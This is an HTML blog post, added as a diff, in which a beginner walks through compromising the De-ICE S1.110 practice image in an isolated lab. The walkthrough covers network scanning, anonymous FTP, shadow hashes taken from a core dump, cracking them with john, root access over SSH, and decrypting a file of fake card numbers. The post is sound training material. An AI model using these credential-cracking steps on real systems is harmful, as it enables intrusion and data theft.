@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Solving De-ICE S1.110 | Spans’ Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Solving De-ICE S1.110" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="The De-ICE S1.110 is an entry-level vulnerable live CD image, meant for learning the very basics of penetration testing. I, being an absolute beginner in such, decided to tackle the challenge. I started with the De-ICE S1.100 image, but ended up following a bunch of guides because of some weird OpenSSL decryption issues. However, this one I actually solved all by myself, applying the knowledge I gained from before. Here goes:" />
+<meta property="og:description" content="The De-ICE S1.110 is an entry-level vulnerable live CD image, meant for learning the very basics of penetration testing. I, being an absolute beginner in such, decided to tackle the challenge. I started with the De-ICE S1.100 image, but ended up following a bunch of guides because of some weird OpenSSL decryption issues. However, this one I actually solved all by myself, applying the knowledge I gained from before. Here goes:" />
+<link rel="canonical" href="https://blog.spans.fi/2017/09/09/solving-de-ice-s1-110.html" />
+<meta property="og:url" content="https://blog.spans.fi/2017/09/09/solving-de-ice-s1-110.html" />
+<meta property="og:site_name" content="Spans’ Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2017-09-09T18:12:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Solving De-ICE S1.110" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2017-09-09T18:12:00+00:00","datePublished":"2017-09-09T18:12:00+00:00","description":"The De-ICE S1.110 is an entry-level vulnerable live CD image, meant for learning the very basics of penetration testing. I, being an absolute beginner in such, decided to tackle the challenge. I started with the De-ICE S1.100 image, but ended up following a bunch of guides because of some weird OpenSSL decryption issues. However, this one I actually solved all by myself, applying the knowledge I gained from before. Here goes:","headline":"Solving De-ICE S1.110","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.spans.fi/2017/09/09/solving-de-ice-s1-110.html"},"url":"https://blog.spans.fi/2017/09/09/solving-de-ice-s1-110.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://blog.spans.fi/feed.xml" title="Spans' Blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Spans&#39; Blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Solving De-ICE S1.110</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2017-09-09T18:12:00+00:00" itemprop="datePublished">Sep 9, 2017
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>The <a href="https://www.vulnhub.com/entry/de-ice-s1110,9/">De-ICE S1.110</a> is an entry-level vulnerable live CD image, meant for learning the very basics of penetration testing. I, being an absolute beginner in such, decided to tackle the challenge. I started with the <a href="https://www.vulnhub.com/entry/de-ice_s1100-level-1,8/">De-ICE S1.100</a> image, but ended up following a bunch of guides because of some weird OpenSSL decryption issues. However, this one I actually solved all by myself, applying the knowledge I gained from before. Here goes:</p>
+
+<h2 id="the-environment">The environment</h2>
+
+<p>I set up a local restricted “lab”-environment in VMware Workstation, that contains a 64-bit Kali Linux VM, and of course, the vulnerable live CD image running in a small VM. The host-only network contains VMware’s DHCP-server so Kali can get itself an address, but the live CD is configured to have a static IP (<code class="language-plaintext highlighter-rouge">192.168.1.110</code>) out of the box.</p>
+
+<h2 id="starting-off-as-usual">Starting off as usual</h2>
+
+<p>Let’s pretend for a moment that I don’t already know what address the target is behind, but I do know I am in the same network as it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# ip a
+...
+    inet 192.168.1.3/24
+...
+</code></pre></div></div>
+
+<p>To try and find the target, I’ll use <code class="language-plaintext highlighter-rouge">netdiscover</code>. <code class="language-plaintext highlighter-rouge">netdiscover</code> is a tool that scans a given network range with ARP, so scanning the <code class="language-plaintext highlighter-rouge">/24</code> network I’m in should take no time at all.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# netdiscover -r 192.168.1.0/24
+ Currently scanning: Finished! | Screen View: Unique Hosts
+
+ 2 Captured ARP Req/Rep packets, from 2 hosts. Total size: 120
+ 
+ _____________________________________________________________________________
+   IP At MAC Address Count Len MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ 192.168.1.110 00:0c:29:a5:eb:3b 1 60 Unknown vendor
+
+ 192.168.1.254 00:50:56:f3:47:84 1 60 Unknown vendor
+</code></pre></div></div>
+
+<p>Found it. <code class="language-plaintext highlighter-rouge">.254</code> is VMware’s DHCP-server, so <code class="language-plaintext highlighter-rouge">.110</code> must be the target. The next step is to find out what services are on the target, and what ports they listen to. This is where <code class="language-plaintext highlighter-rouge">nmap</code> comes in.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -A -T4 192.168.1.110
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-09-09 01:17 EEST
+Nmap scan report for 192.168.1.110
+Host is up (0.00011s latency).
+Not shown: 996 closed ports
+PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 2.0.4
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x 7 1000 513 180 Sep 09 00:48 download
+|_drwxrwxrwx 2 0 0 60 Feb 26 2007 incoming [NSE: writeable]
+22/tcp open tcpwrapped
+|_sshv1: Server supports SSHv1
+80/tcp open http Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
+| http-methods:
+|_ Potentially risky methods: TRACE
+|_http-server-header: Apache/2.2.4 (Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2
+|_http-title: Site doesn't have a title (text/html).
+631/tcp open ipp CUPS 1.1
+| http-methods:
+|_ Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+MAC Address: 00:0C:29:A5:EB:3B (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.13 - 2.6.32
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT ADDRESS
+1 0.11 ms 192.168.1.110
+</code></pre></div></div>
+
+<p>The options passed to <code class="language-plaintext highlighter-rouge">nmap</code> enable OS and service detection (<code class="language-plaintext highlighter-rouge">-A</code>), and faster execution (<code class="language-plaintext highlighter-rouge">-T4</code>). <code class="language-plaintext highlighter-rouge">nmap</code> finished after about a minute and gave out a plethora of information:</p>
+
+<ul>
+  <li>There’s an FTP server that allows for anonymous login. At its root, there are two directories: <code class="language-plaintext highlighter-rouge">download</code> and <code class="language-plaintext highlighter-rouge">incoming</code>. I’ll be taking a look at these soon.</li>
+  <li>SSH is at its standard port 22.</li>
+  <li>Apache is hosting a site over HTTP. It also has OpenSSL enabled: this might be useful.</li>
+</ul>
+
+<h2 id="whats-there-on-the-website">What’s there on the website</h2>
+
+<p>Navigating over to <code class="language-plaintext highlighter-rouge">http://192.182.1.110</code> gives the info page for the live CD. There’s a link to the game-related web pages, it’s really hard to miss. At the top, there’s a link to some hints on cracking the live CD, if you’re stuck.</p>
+
+<p>Over at the game-related web page, it talks of being an FTP server for the network team; this is a continuation from the previous live CD (S1.100). The site has a list of some system administrators, with their names and respective email addresses. I’m going to go ahead and guess that these names are valid logins for the target. Simply iterating the names by hand provides the following username candidates:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adamsa
+aadams
+adams
+banterb
+bbanter
+banter
+coffeec
+ccoffee
+coffee
+</code></pre></div></div>
+
+<p>Having just recently compromised the previous target, these guys most likely have realised to <em>not</em> use their names as their passwords. At this point, I could run <code class="language-plaintext highlighter-rouge">hydra</code> over these names and a wordlist, but that takes time and it’s boring to just stare at a blinking terminal cursor. But hey, there’s the FTP server.</p>
+
+<h2 id="what-are-these-files-anyway">What are these files anyway?</h2>
+
+<p>Simply navigating to <code class="language-plaintext highlighter-rouge">ftp://192.168.1.110</code> gives a nice graphical browser for the FTP-server. The <code class="language-plaintext highlighter-rouge">incoming</code> directory is empty, but <code class="language-plaintext highlighter-rouge">download</code> is full of goodies. At first glance, it seems to contain various common files and directories used to configure servers - sounds like something the web page talked about before. The superuser’s home doesn’t contain anything interesting, neither does <code class="language-plaintext highlighter-rouge">var</code>. However, there’s a file called <code class="language-plaintext highlighter-rouge">shadow</code> under <code class="language-plaintext highlighter-rouge">/etc</code>. Huh.</p>
+
+<p>I must admit, at this point I chuckled a bit, thinking some fool has left user password hashes just laying around in an anonymous FTP server. But, the file only contains a hash for <code class="language-plaintext highlighter-rouge">root</code>, and nothing else. No mentions of the users I previously found. Just for good measure, I grabbed the hash, stuffed it into a file called <code class="language-plaintext highlighter-rouge">roothash</code> and ran <code class="language-plaintext highlighter-rouge">john</code> on it.</p>
+
+<h2 id="cant-be-that-easy-now-can-it">Can’t be that easy, now can it</h2>
+
+<p><code class="language-plaintext highlighter-rouge">john</code> (the Ripper) is a tool that cracks hashed passwords, such as the ones in <code class="language-plaintext highlighter-rouge">shadow</code>. Telling it to run in the <code class="language-plaintext highlighter-rouge">-single</code> mode will crack only the most weakest passwords, but it’s still something.</p>
+
+<p>Something it sure is. This hash is for the password <code class="language-plaintext highlighter-rouge">toor</code>. Pinnacle of security over here. There’s just no way this is the actual password for root on the target. Even if it was, I won’t even bother trying to log in to root over SSH - no way it’s deliberately configured to allow root login.</p>
+
+<p>I’ll try something else.</p>
+
+<h2 id="someone-did-forget-something-just-laying-around">Someone did forget something just laying around</h2>
+
+<p>Still looking over <code class="language-plaintext highlighter-rouge">/etc</code>, a file called <code class="language-plaintext highlighter-rouge">core</code> pops out. This is a binary file, a coredump most likely. I can’t process it in a browser, so I have to get it to my machine. I’ll download it with <code class="language-plaintext highlighter-rouge">wget</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# wget ftp://192.168.1.110/download/etc/core
+--2017-09-09 01:53:57-- ftp://192.168.1.110/download/etc/core
+           =&gt; ‘core’
+Connecting to 192.168.1.110:21... connected.
+Logging in as anonymous ... Logged in!
+==&gt; SYST ... done. ==&gt; PWD ... done.
+==&gt; TYPE I ... done. ==&gt; CWD (1) /download/etc ... done.
+==&gt; SIZE core ... 362436
+==&gt; PASV ... done. ==&gt; RETR core ... done.
+Length: 362436 (354K) (unauthoritative)
+
+core 100%[============================================================================&gt;] 353,94K --.-KB/s in 0,001s  
+
+2017-09-09 01:53:57 (275 MB/s) - ‘core’ saved [362436]
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">file</code> confirms my suspicions; it sure is a coredump file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# file core
+core: ELF 32-bit LSB core file Intel 80386, version 1 (SYSV)
+</code></pre></div></div>
+
+<p>I’m not too familiar with analysing coredumps, so I’ll just resort to searching for any leftover <code class="language-plaintext highlighter-rouge">strings</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# strings core
+...
+.dynamic
+.useless
+root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::bin:*:9797:0:::::daemon:*:9797:0:::::adm:*:9797:0:::::lp:*:9797:0:::::sync:*:9797:0:::::shutdown:*:9797:0:::::halt:*:9797:0:::::mail:*:9797:0:::::news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::
+</code></pre></div></div>
+
+<p>Now hold on just a moment. Do I see a <code class="language-plaintext highlighter-rouge">shadow</code> there, with the users I previously found? Quickly formatting the string yields the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
+bin:*:9797:0:::::
+daemon:*:9797:0:::::a
+dm:*:9797:0:::::
+lp:*:9797:0:::::
+sync:*:9797:0:::::
+shutdown:*:9797:0:::::
+halt:*:9797:0:::::
+mail:*:9797:0:::::
+news:*:9797:0:::::
+uucp:*:9797:0:::::
+operator:*:9797:0:::::
+games:*:9797:0:::::
+ftp:*:9797:0:::::
+smmsp:*:9797:0:::::
+mysql:*:9797:0:::::
+rpc:*:9797:0:::::
+sshd:*:9797:0:::::
+gdm:*:9797:0:::::
+pop:*:9797:0:::::
+nobody:*:9797:0:::::
+aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
+bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
+ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::
+</code></pre></div></div>
+
+<h2 id="lets-do-some-bruteforcing">Let’s do some bruteforcing</h2>
+
+<p>I’ll store the hashes in a file called <code class="language-plaintext highlighter-rouge">hashes</code> and run <code class="language-plaintext highlighter-rouge">john</code> on it. Just <code class="language-plaintext highlighter-rouge">-single</code> yields no results, which is quite expected. It’s time to bring out the big guns: <code class="language-plaintext highlighter-rouge">-rules</code>, <code class="language-plaintext highlighter-rouge">-wordlist</code> and <code class="language-plaintext highlighter-rouge">-fork</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# john -rules -wordlist=/usr/share/wordlists/rockyou.txt -fork=8 hashes
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">-wordlist</code> defines a list of words to try as passwords, and <code class="language-plaintext highlighter-rouge">-rules</code> enables multiple mutation rules that are applied to each password. Kali comes packed with the “rockyou”-wordlist, that contains around 14.3 million commonly used passwords. This list combined with the default ruleset for john creates a massive amount of password candidates to go through. To ease this process, I’ll tell <code class="language-plaintext highlighter-rouge">john</code> to use eight processes, with <code class="language-plaintext highlighter-rouge">-fork=8</code>, to go through the passwords. (Eight, because that’s how many cores my Kali VM has available). Hitting almost any key while <code class="language-plaintext highlighter-rouge">john</code> is running will print its status:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 0g 0:00:00:07 0.01% (ETA: 2017-09-10 15:03) 0g/s 6515p/s 26067c/s 26067C/s purrfect..poppa1
+5 0g 0:00:00:07 7.03% (ETA: 02:10:28) 0g/s 6593p/s 26378c/s 26378C/s fadhli1..estevez1
+7 0g 0:00:00:07 10.56% (ETA: 02:09:55) 0g/s 6935p/s 27745c/s 27745C/s eillomeillom..edwoodedwood
+8 0g 0:00:00:07 12.29% (ETA: 02:09:45) 0g/s 6281p/s 25127c/s 25127C/s htehpaj..yemaj
+3 0g 0:00:00:07 3.52% (ETA: 02:12:08) 0g/s 6604p/s 26422c/s 26422C/s Dancer91..Dafydd
+6 0g 0:00:00:07 8.78% (ETA: 02:10:08) 0g/s 6515p/s 26061c/s 26061C/s Mybike1..Muhamed1
+4 0g 0:00:00:07 5.27% (ETA: 02:11:01) 0g/s 6273p/s 25100c/s 25100C/s mamadoras..mahpahs
+2 0g 0:00:00:07 1.87% (ETA: 02:15:03) 0g/s 6255p/s 25025c/s 25025C/s janeiro..jammin
+</code></pre></div></div>
+
+<p>About 30 seconds worth of increasing my room’s ambient temperature, <code class="language-plaintext highlighter-rouge">john</code> has found two passwords:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# john -show hashes
+root:Complexity:13574:0:::::
+bbanter:Zymurgy:13571:0:99999:7:::
+</code></pre></div></div>
+
+<p>Our beloved intern Bob from before did come up with a better password than just <code class="language-plaintext highlighter-rouge">bbanter</code>, but it still succumbed to the bruteforce. I also have a password for root (!).</p>
+
+<h2 id="get-in-and-find-something-tasty">Get in and find something tasty</h2>
+
+<p>Now that I have a user and a password for it, I can log in through SSH.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# ssh bbanter@192.168.1.110
+bbanter@192.168.1.110's password:
+Linux 2.6.16.
+bbanter@slax:~$
+</code></pre></div></div>
+
+<p>I’m not interested in this user; I’ll head straight for <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bbanter@slax:~$ su
+Password: **********
+root@slax:/home/bbanter#
+</code></pre></div></div>
+
+<p>This being an FTP-server, I’m guessing the good stuff is over at the <code class="language-plaintext highlighter-rouge">ftp</code> user’s home directory. However, it just contains the stuff that’s already available through the anonymous FTP server. Let’s check the other users:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@slax:/home# ls -a
+. .. aadams bbanter	ccoffee ftp root
+</code></pre></div></div>
+
+<p>What’s this? root has a directory for itself over at <code class="language-plaintext highlighter-rouge">/home</code>?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@slax:/home/root# ls -a
+. .. .save .screenrc
+</code></pre></div></div>
+
+<p>There’s a directory called <code class="language-plaintext highlighter-rouge">.save</code>, I wonder what’s inside.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@slax:/home/root/.save# ls
+copy.sh customer_account.csv.enc
+</code></pre></div></div>
+
+<p>Seems like I found something tasty.</p>
+
+<h2 id="openssl-decryption">OpenSSL decryption</h2>
+
+<p>There’s two files here: a shell script called <code class="language-plaintext highlighter-rouge">copy.sh</code> and an allegedly encrypted CSV-file of customer accounts. I’ll take a look at the script first:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@slax:/home/root/.save# cat copy.sh 
+#!/bin/sh
+#encrypt files in ftp/incoming
+openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/$1 -out /home/root/.save/$1.enc -pass file:/etc/ssl/certs/pw
+#remove old file
+rm /home/ftp/incoming/$1
+</code></pre></div></div>
+
+<p>The script, as it says in the comments, encrypts files in <code class="language-plaintext highlighter-rouge">/home/ftp/incoming</code>, encrypts them and stores them in this <code class="language-plaintext highlighter-rouge">.save</code> directory. Afterwards, it removes the original, which is why <code class="language-plaintext highlighter-rouge">incoming</code> was empty. What matters here is the encryption:</p>
+
+<ul>
+  <li>It’s done with OpenSSL’s symmetric encryption suite</li>
+  <li>It uses AES-256-CBC as a cipher</li>
+  <li>It uses a password stored in <code class="language-plaintext highlighter-rouge">/etc/ssl/certs/pw</code></li>
+</ul>
+
+<p>Because of this, I can decrypt this file in-place, right here, right now.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@slax:/home/root/.save# openssl enc -d -aes-256-cbc -in customer_account.csv.enc -pass file:/etc/ssl/certs/pw
+"CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
+1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
+1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
+1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
+1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
+1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
+1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"
+</code></pre></div></div>
+
+<p>And there it is; sensitive customer records that contain credit card information. “No Security Corp.” living up to its name.</p>
+
+<!--kg-card-end: markdown-->
+
+  </div><a class="u-url" href="/2017/09/09/solving-de-ice-s1-110.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Spans&#39; Blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Spans&#39; Blog</li><li><a class="u-email" href="mailto:me@spans.fi">me@spans.fi</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/spanfile"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">spanfile</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
